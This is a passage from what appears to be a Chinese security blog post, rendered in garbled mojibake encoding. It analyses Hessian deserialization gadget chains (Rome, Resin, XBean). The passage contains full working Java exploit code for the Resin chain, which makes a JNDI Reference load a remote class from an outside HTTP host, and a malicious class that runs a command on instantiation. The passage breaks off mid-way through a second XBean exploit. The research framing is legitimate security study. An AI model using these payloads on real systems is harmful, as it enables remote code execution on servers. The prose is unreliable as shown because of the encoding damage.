title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å‰é¢çš„åˆ†æå¯ä»¥çŸ¥é“Hessianå¤§éƒ¨åˆ†æ˜¯åˆ©ç”¨åå°„å†™å…¥å€¼ï¼Œä¸”è¿‡ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨ç±»çš„readObjectæ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰è§¦å‘getter&#x2F;setteræ–¹æ³•ï¼Œé‚£ä¹ˆæ¼æ´ç‚¹åœ¨å“ªå‘¢</p><p>æ¼æ´ç‚¹å°±åœ¨æˆ‘ä»¬å‰é¢è¯´è¿‡çš„å¯¹Mapç±»å‹æ•°æ®çš„å¤„ç†ä¸Šï¼Œ<code>MapDeserializer#readMap</code> å¯¹ Map ç±»å‹æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ˜¯ä¼šåˆ›å»ºç›¸åº”çš„ Map å¯¹è±¡ï¼Œå¹¶å°† Key å’Œ Value åˆ†åˆ«ååºåˆ—åŒ–åä½¿ç”¨ put æ–¹æ³•å†™å…¥æ•°æ®ã€‚åœ¨æ²¡æœ‰æŒ‡å®š Map çš„å…·ä½“å®ç°ç±»æ—¶ï¼Œå°†ä¼šé»˜è®¤ä½¿ç”¨ HashMap ï¼Œå¯¹äº SortedMapï¼Œå°†ä¼šä½¿ç”¨ TreeMapã€‚</p><p><img src="https://cdn.clown2024.cn/202410100032949.png" alt="image-20241010003247887"></p><p>é‚£åˆ©ç”¨çš„æ–¹å¼å…¶å®å°±æ¯”è¾ƒå¥½è”æƒ³äº†å¯¹äºè¿™ä¸¤ä¸ªç±»</p><p>HashMapåœ¨putçš„æ—¶å€™ä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œä»è€Œè°ƒç”¨key.hashCodeã€‚</p><p><img src="https://cdn.clown2024.cn/202410100035334.png" alt="image-20241010003515291"></p><p>TreeMap åœ¨ put æ—¶ï¼Œç”±äºè¦è¿›è¡Œæ’åºï¼Œæ‰€ä»¥è¦å¯¹ key è¿›è¡Œæ¯”è¾ƒæ“ä½œï¼Œå°†ä¼šè°ƒç”¨ compare æ–¹æ³•ï¼Œä¼šè°ƒç”¨ key çš„ compareTo æ–¹æ³•ã€‚</p><p><img src="https://cdn.clown2024.cn/202410100035008.png" alt="image-20241010003554961"></p><p>è¿™ä¹ˆä¸€çœ‹Hessianååºåˆ—åŒ–åˆ©ç”¨è¢«é™åˆ¶å¾—æ¯”è¾ƒçª„</p><ul><li>kick-off chain èµ·å§‹æ–¹æ³•åªèƒ½ä¸º hashCode&#x2F;equals&#x2F;compareTo æ–¹æ³•ï¼›</li><li>åˆ©ç”¨é“¾ä¸­è°ƒç”¨çš„æˆå‘˜å˜é‡ä¸èƒ½ä¸º transient ä¿®é¥°ï¼›</li><li>æ‰€æœ‰çš„è°ƒç”¨ä¸ä¾èµ–ç±»ä¸­ readObject çš„é€»è¾‘ï¼Œä¹Ÿä¸ä¾èµ– getter&#x2F;setter çš„é€»è¾‘ã€‚</li></ul><h1 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h1><p>åœ¨<a href="https://github.com/mbechler/marshalsec">marshalsec</a>é¡¹ç›®é‡Œæœ‰å…³äºè¯¥ååºåˆ—åŒ–çš„å®ç°ï¼Œæœ‰ä¸‹é¢äº”æ¡é“¾</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h2 id="romeé“¾"><a href="#Romeé“¾" class="headerlink" title="Romeé“¾"></a>Romeé“¾</h2><p>Romeé“¾çš„æ ¸å¿ƒæ˜¯ä»–çš„ToStringBeançš„toStringæ–¹æ³•ï¼Œä»–å¯ä»¥è°ƒç”¨ä¼ å…¥ç±»çš„æ‰€æœ‰æ— å‚getteræ–¹æ³•ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰“JdbcRowSetImplçš„é“¾å­è§¦å‘jndi</p><p>ç„¶åToStringBeanå¤–é¢åŒ…ä¸€å±‚EqualsBeanå’ŒHashMapå³å¯</p><p>è§¦å‘é“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>JdbcRowSetImpl#getDatabaseMetaData<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410101102136.png" alt="image-20241010110223027"></p><p><img src="https://cdn.clown2024.cn/202410101102006.png" alt="image-20241010110235946"></p><h3 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h3><p>ä¸Šé¢çš„JNDIåˆ©ç”¨éœ€è¦å‡ºç½‘ï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©SignedObject#getObjectæ¥æ‰“äºŒæ¬¡ååºåˆ—åŒ–</p><p>é“¾å­æ”¹æˆè¿™æ ·å°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>SignedObject#getObject<br></code></pre></td></tr></table></figure><p>ç„¶åå°è£…ä¸€ä¸ªæƒ³è¦çš„é“¾å­è¿›å»å°±è¡Œäº†</p><h2 id="resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>è¯¥é“¾å­æœ€ç»ˆæ•ˆæœæ‰“çš„æ˜¯è¿œç¨‹ç±»åŠ è½½</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/136727060">https://blog.csdn.net/uuzeray/article/details/136727060</a></p><p>Resinæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ã€é«˜æ€§èƒ½çš„å¼€æºJavaåº”ç”¨æœåŠ¡å™¨ã€‚å®ƒæ˜¯ç”±Caucho Technologyå¼€å‘çš„ï¼Œæ—¨åœ¨æä¾›å¯é çš„Webåº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„è¿è¡Œç¯å¢ƒï¼Œå’ŒTomcatä¸€æ ·æ˜¯ä¸ªæœåŠ¡å™¨ï¼›ä»–å¸¸å’ŒHessianäº§ç”Ÿè”ç³»</p><p>æµ‹è¯•æ—¶å¯ä»¥å¯¼å…¥ä¸‹é¢çš„åŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.64<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Resin è¿™æ¡åˆ©ç”¨é“¾çš„å…¥å£ç‚¹å®é™…ä¸Šæ˜¯ HashMap å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡æ—¶è§¦å‘çš„ <code>com.sun.org.apache.xpath.internal.objects.XString</code> çš„ <code>equals</code> æ–¹æ³•ã€‚</p><p>XStringçš„åˆ©ç”¨åœ¨ROMEçš„HotSwappableTargetSourceåˆ©ç”¨é“¾æœ‰ç”¨åˆ°è¿‡</p><p><img src="https://cdn.clown2024.cn/202410102001525.png" alt="image-20241010200147467"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯com.caucho.naming.QNameçš„toStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102003734.png" alt="image-20241010200338680"></p><p>è¿™é‡Œçš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯QNameæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å¾—å…ˆäº†è§£ä¸€ä¸‹ï¼Œæ‰èƒ½çŸ¥é“ä»–è¿™æ ·ä¸ºä»€ä¹ˆå¯ä»¥è§¦å‘</p><p>çœ‹ä¸€ä¸‹ä»–çš„æè¿°</p><p><img src="https://cdn.clown2024.cn/202410102030167.png" alt="image-20241010203001097"></p><p>è¿™é‡Œæè¿°æ„æ€æ˜¯ä»£è¡¨ä¸€ä¸ªå·²è§£æçš„JNDIåç§°</p><p>çœ‹ä¸€ä¸‹ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102032765.png" alt="image-20241010203211713"></p><p>QNameå¯¹è±¡çš„åŠŸèƒ½æ˜¯ç”¨äºè¡¨ç¤ºä¸€ä¸ªJNDIé™å®šåï¼ˆqualified nameï¼‰ï¼Œé€šè¿‡ä¼ å…¥çš„Contextå¯¹è±¡ä»¥åŠä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼ˆfirstå’Œrestï¼‰ï¼ŒQNameå¯¹è±¡å¯ä»¥å°†è¿™äº›ä¿¡æ¯ç»„åˆèµ·æ¥å½¢æˆä¸€ä¸ªå®Œæ•´çš„é™å®šåã€‚</p><p>Contextæ¥å£çš„æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This interface represents a naming context, which consists of a set of name-to-object bindings. It contains methods for examining and updating these bindings.<br></code></pre></td></tr></table></figure><p>æ­¤æ¥å£è¡¨ç¤ºä¸€ä¸ªå‘½åä¸Šä¸‹æ–‡ï¼Œå®ƒç”±ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šç»„æˆã€‚å®ƒåŒ…å«æ£€æŸ¥å’Œæ›´æ–°è¿™äº›ç»‘å®šçš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯jndiçš„ç›¸å…³æ“ä½œ</p><p>ç„¶åæˆ‘ä»¬è¦ç”¨åˆ°çš„Contextçš„å®ç°ç±»æ˜¯ContinuationContext</p><p>æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102039546.png" alt="image-20241010203937489"></p><p>CannotProceedExceptionæ˜¯javax.namingå¼‚å¸¸ä½“ç³»ä¸­çš„ä¸€ç§å¼‚å¸¸ï¼Œé€šå¸¸åœ¨æœ¬åœ°åŠ è½½ç±»å¤±è´¥æ—¶ä½¿ç”¨ã€‚å®ƒçš„ä½œç”¨æ˜¯å¯¹æ— æ³•ç»§ç»­è¿›è¡Œæ“ä½œçš„å¼‚å¸¸æƒ…å†µè¿›è¡Œå¤„ç†ã€‚</p><p>å¤„ç†çš„å…³é”®åœ¨Referenceç±»ï¼Œæ–‡ç« ç»™äº†ä¸€ä¸ªå¯¹CannotProceedExceptionç±»çš„æ„é€ </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://124.222.136.33:1337/&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br> <br><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br> <br><span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br><span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br></code></pre></td></tr></table></figure><p>Referenceæ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102106681.png" alt="image-20241010210638627"></p><p>ç°åœ¨å›åˆ°å‰é¢QNameçš„toStringæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨ContinuationContext#composeNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102113650.png" alt="image-20241010211324591"></p><p>ç„¶åè°ƒç”¨åˆ°getTargetContextæ–¹æ³•ï¼Œè¿™é‡Œçš„ctx.composeNameæ–¹æ³•å¯ä»¥å¿½ç•¥ï¼Œä¸åœ¨åˆ©ç”¨é“¾ä¸­</p><p><img src="https://cdn.clown2024.cn/202410102114406.png" alt="image-20241010211417350"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°NamingManager.getContextæ–¹æ³•é‡Œé¢ï¼Œä¸è¿‡è¿˜éœ€è¦æ»¡è¶³å‰é¢çš„ä¸¤ä¸ªæ¡ä»¶</p><p>contCtx &#x3D;&#x3D; nullï¼Œåœ¨æ„é€ ä¸­æœ¬èº«å°±ä¸è®¾ç½®ï¼Œæ‰€ä»¥ä¸éœ€è¦è€ƒè™‘<br>cpe.getResolvedObj()è¿”å›ä¸ä¸ºnull(å…¶å®è¿”å›çš„å°±æ˜¯æˆ‘ä»¬ä¸Šé¢ç»™CannotProceedExceptionæ„é€ çš„æ¶æ„Reference)ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šä¸ºnull</p><p>è¿™é‡Œä¼ çš„æ˜¯cpe.getResolvedObjï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ çš„Referenceç±»</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202410102122102.png" alt="image-20241010212200426"></p><p>ç„¶åæ¼æ´çš„è§¦å‘ç‚¹å°±åœ¨NamingManager#getObjectInstanceè¿™ä¸ªæ–¹æ³•é‡Œé¢ï¼Œä»åå­—çœ‹å°±æ˜¯è¦å¯¹æˆ‘ä»¬ä¼ å…¥çš„Referenceç±»è¿›è¡Œå®ä¾‹åŒ–</p><p>æœ‰å…³è¯¥æ–¹æ³•çš„æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Creates an instance of an object for the specified object and environment.<br>If an object factory builder has been installed, it is used to create a factory for creating the object. Otherwise, the following rules are used to create the object:<br>If refInfo is a Reference or Referenceable containing a factory class name, use the named factory to create the object. Return refInfo if the factory cannot be created<br>ç¿»è¯‘ä¸€ä¸‹ï¼š<br>ä¸ºæŒ‡å®šçš„å¯¹è±¡å’Œç¯å¢ƒåˆ›å»ºå¯¹è±¡çš„å®ä¾‹ã€‚<br>å¦‚æœå·²å®‰è£…å¯¹è±¡å·¥å‚ç”Ÿæˆå™¨ï¼Œåˆ™ä½¿ç”¨å®ƒæ¥åˆ›å»ºç”¨äºåˆ›å»ºå¯¹è±¡çš„å·¥å‚ã€‚å¦åˆ™ï¼Œå°†ä½¿ç”¨ä»¥ä¸‹è§„åˆ™åˆ›å»ºå¯¹è±¡ï¼š<br>å¦‚æœrefInfoæ˜¯åŒ…å«å·¥å‚ç±»åçš„Referenceæˆ–Referenceableï¼Œè¯·ä½¿ç”¨å‘½åçš„å·¥å‚åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœæ— æ³•åˆ›å»ºå·¥å‚ï¼Œåˆ™è¿”å›refInfoã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102142943.png" alt="image-20241010214214868"></p><p>ç„¶åå…³é”®ç±»æ–¹æ³•æ˜¯getObjectFactoryFromReference</p><p><img src="https://cdn.clown2024.cn/202410102157527.png" alt="image-20241010215719459"></p><p>è¿™é¦–å…ˆä¼šä»æœ¬åœ°åŠ è½½ç±»ï¼Œè‚¯å®šåŠ è½½ä¸åˆ°ï¼Œç„¶åå°±ä»codebaseåŠ è½½ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¿œç¨‹åœ°å€é‚£é‡Œï¼Œæœ€ååŠè¿›è¡Œç±»çš„å®ä¾‹åŒ–ï¼Œç„¶åè§¦å‘æ¼æ´</p><p>ç„¶åå°±æ˜¯hashMapè¦è§¦å‘equalsè¿˜è¦æ„é€ å“ˆå¸Œç›¸ç­‰ï¼Œæœ‰ç‚¹æ‡’å¾—å†åˆ†æäº†ï¼Œç›´æ¥copyæ–‡ç« çš„expå°æ”¹ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">// åˆ›å»ºContinuationContextå¯¹è±¡</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);<br>        <span class="hljs-comment">// æ„é€ æ–¹æ³•ä¸ºprotectedä¿®é¥°</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">continuationContext</span> <span class="hljs-operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;());<br><br><br>        <span class="hljs-comment">// åˆ›å»ºQName</span><br>        <span class="hljs-type">QName</span> <span class="hljs-variable">qName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QName</span>(continuationContext, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(qName.hashCode());<br>        <span class="hljs-comment">// åˆ›å»ºXtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// åˆ›å»ºHashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(qName, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»TestRef</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRef</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestRef</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102208703.png" alt="image-20241010220704531"></p><h2 id="xbean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><p>è¿™æ¡é“¾å’ŒResinå·®ä¸å¤š</p><p>å¯¼å…¥ä¸‹é¢ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-naming<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#equals--&gt;XString#equals--&gt;ContextUtil.ReadOnlyBinding#toString--&gt;Binding#toString--&gt;ContextUtil.ReadOnlyBinding#getObject--&gt;ContextUtil#resolve--&gt;NamingManager#getObjectInstance<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å…³é”®çš„åœ°æ–¹</p><p>ContextUtil.ReadOnlyBinding#toStringæœ¬èº«æ²¡æœ‰toStringæ‰€ä»¥å°±èµ°åˆ°çˆ¶ç±»Binding#toString</p><p><img src="https://cdn.clown2024.cn/202410102223585.png" alt="image-20241010222327507"></p><p>ContextUtil.ReadOnlyBinding#getObject</p><p><img src="https://cdn.clown2024.cn/202410102224965.png" alt="image-20241010222415889"></p><p>ContextUtil#resolve</p><p><img src="https://cdn.clown2024.cn/202410102227755.png" alt="image-20241010222504369"></p><p>ç„¶ååé¢çš„å°±å’Œå‰é¢ä¸€æ ·äº†</p><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.ContextUtil;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.WritableContext;<br><br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XBeanUse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span 